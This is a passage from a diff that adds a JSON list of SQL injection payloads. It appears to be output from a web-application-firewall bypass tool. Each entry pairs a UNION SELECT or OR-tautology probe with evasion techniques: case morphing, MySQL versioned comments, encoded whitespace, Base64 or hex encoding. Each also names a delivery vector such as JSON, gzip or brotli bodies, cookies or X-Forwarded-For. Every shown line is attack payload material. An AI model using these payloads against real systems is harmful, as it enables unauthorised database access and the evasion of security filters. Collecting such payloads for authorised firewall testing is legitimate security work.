+      "payload": "3120554e494f4e2053454c4543542047524f55505f434f4e434154284e554c4c2d2d202d",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode"
+      ],
+      "variant": 1969
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::POST-form"
+      ],
+      "variant": 1981
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::POST-form"
+      ],
+      "variant": 1982
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::POST-form"
+      ],
+      "variant": 1983
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::POST-json"
+      ],
+      "variant": 2011
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::POST-json"
+      ],
+      "variant": 2012
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::POST-json"
+      ],
+      "variant": 2013
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::POST-xml"
+      ],
+      "variant": 2041
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::POST-xml"
+      ],
+      "variant": 2042
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::POST-xml"
+      ],
+      "variant": 2043
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::POST-multipart"
+      ],
+      "variant": 2071
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::POST-multipart"
+      ],
+      "variant": 2072
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::POST-multipart"
+      ],
+      "variant": 2073
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\n\tUnIoN/**//**//*!SELECT*/\tNULL--\f-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-br"
+      ],
+      "variant": 2124
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\fUnIoN /**/ /*!50000SELECT*//*!*/NULL--/*x*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-br"
+      ],
+      "variant": 2125
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\nUNION/**/SELECT/**/NULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv",
+        "vector::POST-json-br"
+      ],
+      "variant": 2126
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1/*!*/UnIoN/**//**//*!50000SELECT*//**//**/NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-br"
+      ],
+      "variant": 2127
+    },
+    {
+      "confidence": 0.95,
+      "payload": "0x1 UNION/**//*!SELECT*/  NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph+literal_encode",
+        "vector::POST-json-br"
+      ],
+      "variant": 2128
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1 UNION SELECT NULL-- -",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::identity",
+        "vector::POST-json-br"
+      ],
+      "variant": 2129
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1  UNION/*!50000*/SELECT\n\tNULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv",
+        "vector::POST-json-br"
+      ],
+      "variant": 2130
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::POST-json-br"
+      ],
+      "variant": 2131
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::POST-json-br"
+      ],
+      "variant": 2132
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::POST-json-br"
+      ],
+      "variant": 2133
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 OR 1 IS NOT NULL",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2134
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL--",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2135
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL-- ",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2136
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL--+",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2137
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL#",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2138
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL/*",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2139
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL;--",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2140
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL;#",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2141
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1\tUNION\tSELECT\tNULL--\t-",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2142
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1\nUNION\nSELECT\nNULL--\n-",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2143
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1+(+UNION+(+SELECT+(+NULL--+(+-",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2144
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION ALL SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2145
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION DISTINCT SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2146
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0ASELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2147
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%09SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2148
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0D%0ASELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2149
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0BSELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2150
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0CSELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2151
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%A0SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2152
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION/**/SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-br::rescue"
+      ],
+      "variant": 2153
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\n\tUnIoN/**//**//*!SELECT*/\tNULL--\f-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2184
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\fUnIoN /**/ /*!50000SELECT*//*!*/NULL--/*x*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2185
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\nUNION/**/SELECT/**/NULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2186
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1/*!*/UnIoN/**//**//*!50000SELECT*//**//**/NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2187
+    },
+    {
+      "confidence": 0.95,
+      "payload": "0x1 UNION/**//*!SELECT*/  NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph+literal_encode",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2188
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1 UNION SELECT NULL-- -",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::identity",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2189
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1  UNION/*!50000*/SELECT\n\tNULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2190
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2191
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2192
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::POST-json-gz"
+      ],
+      "variant": 2193
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 OR 1 IS NOT NULL",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2194
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL--",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2195
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL-- ",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2196
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL--+",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2197
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL#",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2198
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL/*",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2199
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL;--",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2200
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL;#",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2201
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1\tUNION\tSELECT\tNULL--\t-",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2202
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1\nUNION\nSELECT\nNULL--\n-",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2203
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1+(+UNION+(+SELECT+(+NULL--+(+-",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2204
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION ALL SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2205
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION DISTINCT SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2206
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0ASELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2207
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%09SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2208
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0D%0ASELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2209
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0BSELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2210
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0CSELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2211
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%A0SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2212
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION/**/SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz::rescue"
+      ],
+      "variant": 2213
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\n\tUnIoN/**//**//*!SELECT*/\tNULL--\f-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2214
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\fUnIoN /**/ /*!50000SELECT*//*!*/NULL--/*x*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2215
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\nUNION/**/SELECT/**/NULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2216
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1/*!*/UnIoN/**//**//*!50000SELECT*//**//**/NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2217
+    },
+    {
+      "confidence": 0.95,
+      "payload": "0x1 UNION/**//*!SELECT*/  NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph+literal_encode",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2218
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1 UNION SELECT NULL-- -",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::identity",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2219
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1  UNION/*!50000*/SELECT\n\tNULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2220
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2221
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2222
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::POST-json-gz-br"
+      ],
+      "variant": 2223
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 OR 1 IS NOT NULL",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2224
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL--",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2225
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL-- ",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2226
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL--+",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2227
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL#",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2228
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL/*",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2229
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL;--",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2230
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL;#",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2231
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1\tUNION\tSELECT\tNULL--\t-",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2232
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1\nUNION\nSELECT\nNULL--\n-",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2233
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1+(+UNION+(+SELECT+(+NULL--+(+-",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2234
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION ALL SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2235
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION DISTINCT SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2236
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0ASELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2237
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%09SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2238
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0D%0ASELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2239
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0BSELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2240
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0CSELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2241
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%A0SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2242
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION/**/SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-gz-br::rescue"
+      ],
+      "variant": 2243
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\n\tUnIoN/**//**//*!SELECT*/\tNULL--\f-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2274
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\fUnIoN /**/ /*!50000SELECT*//*!*/NULL--/*x*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2275
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1\nUNION/**/SELECT/**/NULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::ws_equiv",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2276
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1/*!*/UnIoN/**//**//*!50000SELECT*//**//**/NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2277
+    },
+    {
+      "confidence": 0.95,
+      "payload": "0x1 UNION/**//*!SELECT*/  NULL--\u000b-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv+keyword_morph+literal_encode",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2278
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1 UNION SELECT NULL-- -",
+      "techniques": [
+        "equiv-moat::learn::multipart_file",
+        "equiv-rules::identity",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2279
+    },
+    {
+      "confidence": 0.95,
+      "payload": "1  UNION/*!50000*/SELECT\n\tNULL--/*!*/-",
+      "techniques": [
+        "equiv-moat::learn::path_segment",
+        "equiv-rules::ws_equiv",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2280
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2281
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2282
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::POST-json-bom"
+      ],
+      "variant": 2283
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 OR 1 IS NOT NULL",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2284
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL--",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2285
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL-- ",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2286
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL--+",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2287
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL#",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2288
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL/*",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2289
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL;--",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2290
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION SELECT NULL;#",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2291
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1\tUNION\tSELECT\tNULL--\t-",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2292
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1\nUNION\nSELECT\nNULL--\n-",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2293
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1+(+UNION+(+SELECT+(+NULL--+(+-",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2294
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION ALL SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2295
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION DISTINCT SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2296
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0ASELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2297
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%09SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2298
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0D%0ASELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2299
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0BSELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2300
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%0CSELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2301
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION%A0SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2302
+    },
+    {
+      "confidence": 0.85,
+      "payload": "1 UNION/**/SELECT NULL-- -",
+      "techniques": [
+        "vector::POST-json-bom::rescue"
+      ],
+      "variant": 2303
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::POST-json-array"
+      ],
+      "variant": 2341
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::POST-json-array"
+      ],
+      "variant": 2342
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::POST-json-array"
+      ],
+      "variant": 2343
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::cookie"
+      ],
+      "variant": 2551
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::cookie"
+      ],
+      "variant": 2552
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::cookie"
+      ],
+      "variant": 2553
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::x-forwarded-for"
+      ],
+      "variant": 2605
+    },
+    {
+      "confidence": 0.95,
